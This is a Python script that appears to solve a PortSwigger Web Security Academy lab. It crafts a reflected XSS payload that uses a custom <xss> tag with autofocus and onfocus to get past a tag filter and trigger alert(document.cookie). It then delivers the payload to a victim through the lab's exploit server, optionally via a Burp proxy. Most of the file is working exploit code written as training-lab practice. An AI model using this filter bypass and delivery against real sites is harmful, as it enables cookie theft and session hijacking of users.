#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit Script: Reflected XSS into HTML context with all tags blocked except custom ones

This script targets a PortSwigger Web Security Academy lab scenario where all HTML tags
except custom ones are blocked. The goal is to insert a custom tag (e.g., <xss>) that
triggers an alert(document.cookie).

Steps:
  1. Generate a payload that includes a custom tag with an onfocus event.
  2. Send the payload to the exploit server for delivery, passing through Burp if desired.
  3. When the victim visits the malicious link, the onfocus event triggers alert(document.cookie).
"""

import requests
from colorama import init, Fore, Style

# Initialize colorama (for colored terminal output)
init(autoreset=True)

# ====== CHANGE THESE VALUES ACCORDING TO YOUR ENVIRONMENT ======
LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net"
EXPLOIT_SERVER_URL = "https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net"
# ===============================================================

# ====== BURP PROXY SETTINGS ======
# True にすると、http/https の通信を Burp へ転送します
USE_BURP_PROXY = True

# Burp がデフォルトで待ち受けしている 127.0.0.1:8080 を指定しています
BURP_PROXY = {
    "http":  "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}
# =================================


def build_xss_payload(lab_url: str) -> str:
    """
    Return the HTML/JavaScript payload that will redirect the victim to the lab URL,
    injecting a custom tag <xss> with an onfocus event to trigger alert(document.cookie).
    """
    # カスタムタグ <xss> を使い、autofocus + tabindex=1 でページロード直後にフォーカスを当て、
    # onfocus で alert(document.cookie) を呼び出す
    custom_tag = "<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>"

    # <script> タグ内で location を操作し、検索クエリ部分にカスタムタグを埋め込む
    return f"""
    <script>
        // Automatically redirect to the target lab URL with the XSS payload
        window.location = "{lab_url}/?search={custom_tag}"
    </script>
""".strip()


def deliver_exploit(exploit_server_url: str, payload: str, use_proxy: bool = False) -> requests.Response:
    """
    Deliver the generated payload to the exploit server via a POST request.
    Optionally pass the request through a Burp proxy if use_proxy is True.

    Returns:
        Response object from the exploit server.
    """
    # HTTP レスポンスヘッダを定義
    custom_response_head = (
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html; charset=utf-8"
    )

    # Burp Proxy を使用するかどうかで、proxies を切り替える
    if use_proxy:
        proxies = BURP_PROXY
        verify_setting = False  # Burp の自己署名証明書を検証しない場合は False
    else:
        proxies = None
        verify_setting = True

    # Burp の Exploit サーバに合わせた POST パラメータ
    data = {
        "responseBody": payload,         # 実際に配信するHTML
        "responseHead": custom_response_head,
        "formAction": "DELIVER_TO_VICTIM",  # 被害者に配信する
        "urlIsHttps": "on",
        "responseFile": "/exploit"       # 適切なファイル名
    }

    # エクスプロイトを配信
    return requests.post(
        exploit_server_url,
        data=data,
        proxies=proxies,       # Burp を使う場合のみ設定
        verify=verify_setting  # Burp 証明書を検証しないようにするため False にする
    )


def main():
    print(f"{Fore.CYAN}=== Reflected XSS Exploit Script ==={Style.RESET_ALL}")

    # 1. XSSペイロードを生成
    payload = build_xss_payload(LAB_URL)

    # 2. 生成したペイロードをエクスプロイトサーバに送信
    print(f"{Fore.YELLOW}[*] Delivering exploit to the victim via exploit server...", end="")

    try:
        # use_proxy 引数を USE_BURP_PROXY の値に合わせる
        response = deliver_exploit(EXPLOIT_SERVER_URL, payload, use_proxy=USE_BURP_PROXY)

        if response.status_code == 200:
            print(f"{Fore.GREEN} OK{Style.RESET_ALL}")
            print(f"{Fore.WHITE}[+] The exploit has been successfully delivered!")
        else:
            print(f"{Fore.RED} FAILED{Style.RESET_ALL}")
            print(f"{Fore.RED}[-] Status Code: {response.status_code}")
            print(f"{Fore.RED}[-] Response Body: {response.text}")
            return

    except requests.RequestException as e:
        print(f"{Fore.RED} FAILED{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] An error occurred while sending the request:")
        print(f"{Fore.RED}{e}")
        return

    # 3. 攻撃が成功すると、document.cookieがアラートされ、ラボが「Solved」状態になる想定
    print(f"{Fore.GREEN}[✓] If the victim visits the malicious link, alert(document.cookie) should be triggered.")
    print(f"{Fore.GREEN}[✓] The lab will likely show 'solved' status once the payload is executed.")


if __name__ == "__main__":
    main()
